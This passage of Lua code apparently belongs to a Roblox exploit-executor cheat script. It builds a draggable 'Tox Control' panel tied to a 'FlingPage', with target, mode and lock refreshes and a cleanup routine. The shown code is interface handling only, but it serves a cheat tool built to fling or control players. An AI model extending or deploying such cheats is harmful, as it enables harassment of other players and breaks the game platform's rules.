    topBar.InputBegan:
        Connect(function(input)
            if input.UserInputType
                == Enum.UserInputType.MouseButton1
            or input.UserInputType
                == Enum.UserInputType.Touch then
                dragging = true
                dragStart =
                    input.Position
                startPosition =
                    controlGui.Position
            end
        end)

    AddConnection(
        UserInputService.InputChanged:
            Connect(function(input)
                if not dragging
                or not dragStart
                or not startPosition then
                    return
                end

                if input.UserInputType
                    ~= Enum.UserInputType.MouseMovement
                and input.UserInputType
                    ~= Enum.UserInputType.Touch then
                    return
                end

                local delta =
                    input.Position
                    - dragStart

                controlGui.Position =
                    UDim2.new(
                        startPosition.X.Scale,
                        startPosition.X.Offset
                            + delta.X,
                        startPosition.Y.Scale,
                        startPosition.Y.Offset
                            + delta.Y
                    )
            end)
    )

    AddConnection(
        UserInputService.InputEnded:
            Connect(function(input)
                if input.UserInputType
                    == Enum.UserInputType.MouseButton1
                or input.UserInputType
                    == Enum.UserInputType.Touch then
                    dragging = false
                end
            end)
    )

    if getgenv().RegisterToxLinkedSubGui then
        getgenv().RegisterToxLinkedSubGui(
            "ToxControl",
            controlGui
        )
    end

    if getgenv().RegisterToxSubGuiMinimize then
        getgenv().RegisterToxSubGuiMinimize(
            controlGui,
            -70
        )
    end

    CreateButton(
        "Tox Control",
        FlingPage,
        function()
            RefreshLock()
            RefreshMode()
            RefreshTarget()

            controlGui.Visible =
                not controlGui.Visible
        end
    )

    RefreshRole()
    RefreshMode()
    RefreshLock()

    return controlGui
end

local ControlGui =
    InitToxControlGui()

AddConnection(
    Player.CharacterAdded:
        Connect(function(character)
            FrozenByControl = false

            task.defer(function()
                local root =
                    character:
                        WaitForChild(
                            "HumanoidRootPart",
                            8
                        )

                if root then
                    root.Anchored = false
                end
            end)
        end)
)

getgenv().ToxSystemsCleanup =
    function()
        SetAutoJump(false)

        if Player.Character then
            local root =
                Player.Character:
                    FindFirstChild(
                        "HumanoidRootPart"
                    )

            if root then
                root.Anchored = false
            end
        end

        FrozenByControl = false

        if ControlGui
        and ControlGui.Parent then
            ControlGui.Visible = false
        end
    end

getgenv().ToxSystemsLoaded = true
